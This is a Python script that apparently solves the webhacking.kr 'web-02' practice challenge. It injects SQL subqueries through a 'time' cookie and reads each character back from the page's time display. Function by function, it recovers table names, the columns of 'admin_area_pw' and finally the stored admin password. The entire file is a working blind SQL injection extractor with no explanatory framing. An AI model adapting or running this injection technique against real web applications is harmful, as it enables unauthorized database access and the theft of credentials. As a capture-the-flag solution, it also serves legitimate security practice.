import requests

practice_url = "https://webhacking.kr/challenge/web-02/"

def first_table_name_length():
    blind_sql = "(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)"
    data = {"time": blind_sql}
    req_url = requests.get(practice_url, cookies=data)
    code_conventing = req_url.text.split("\n")[1]
    print(code_conventing)


def first_table_name_get():
    for x in range(1, 14):
        table_sql = "(select ascii(substring(table_name," + str(x) + ",1)) " \
                                                                     "from information_schema.tables " \
                                                                     "where table_schema=database() limit 0,1)"
        data = {"time": table_sql}

        temp_url = requests.get(practice_url, cookies=data)
        code_conventing = temp_url.text.split("\n")[1].split(":")
        print(chr(int(code_conventing[1].replace("0", "")) * 60 + int(code_conventing[2])), end='')

def second_table_lenght():
    table_sql = "(select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)"
    data = {"time": table_sql}
    temp_url = requests.get(practice_url, cookies=data)
    code_conventing = temp_url.text.split("\n")[1].split(":")[2]
    print(code_conventing)



def second_table_name_get():
    for x in range(1, 4):
        table_sql = "(select ascii(substring(table_name," + str(x) + ",1)) " \
                                                                     "from information_schema.tables " \
                                                                     "where table_schema=database() limit 1,1)"
        data = {"time": table_sql}

        temp_url = requests.get(practice_url, cookies=data)
        code_conventing = temp_url.text.split("\n")[1].split(":")
        print(chr(int(code_conventing[1].replace("0", "")) * 60 + int(code_conventing[2])), end='')


def get_column_name():
    column_name_sql = "(select count(column_name) " \
                      "from information_schema.columns " \
                      "where table_name=\'admin_area_pw\')"
    print(column_name_sql)
    data = {"time":column_name_sql}
    temp_url =requests.get(practice_url,cookies=data)
    code_conventing = temp_url.text.split("\n")[1]
    print(code_conventing)


def get_column_name_length():
    column_name_sql = "(select length(column_name) from information_schema.columns where table_name=\"admin_area_pw\")"
    print(column_name_sql)
    data = {"time":column_name_sql}
    temp_url =requests.get(practice_url,cookies=data)
    code_conventing = temp_url.text.split("\n")[1]
    print(code_conventing)


def get_column_guessing_word():
    print(" ==== guessing ==== ")
    for x in range(1,3):
        column_name_sql = "(select ascii(substring(column_name,"+ str(x)+",1)) from information_schema.columns where table_name=\"admin_area_pw\")"
        data = {"time": column_name_sql}
        temp_url = requests.get(practice_url, cookies=data)
        code_conventing = temp_url.text.split("\n")[1].split(":")
        print(chr(int(code_conventing[1].replace("0", "")) * 60 + int(code_conventing[2])), end='')


def get_pw_column_guessing_length():
    column_sql = "(select length(pw) from admin_area_pw)"
    data = {"time": column_sql}
    temp_url = requests.get(practice_url, cookies=data)
    print(temp_url.text)

def get_password_():
    print("password is_ ")
    for x in range(1,18):
        column_sql = "(select ascii(substring(pw,"+str(x)+",1)) from admin_area_pw)"
        data = {"time": column_sql}
        temp_url = requests.get(practice_url, cookies=data)
        code_conventing = temp_url.text.split("\n")[1].split(":")
        print(chr(int(code_conventing[1].replace("0", "")) * 60 + int(code_conventing[2])), end='')

if __name__ == '__main__':

    first_table_name_length()
    first_table_name_get()
    second_table_lenght()
    second_table_name_get()

    get_column_name()
    get_column_name_length()
    get_column_guessing_word()

    get_pw_column_guessing_length()
    get_password_()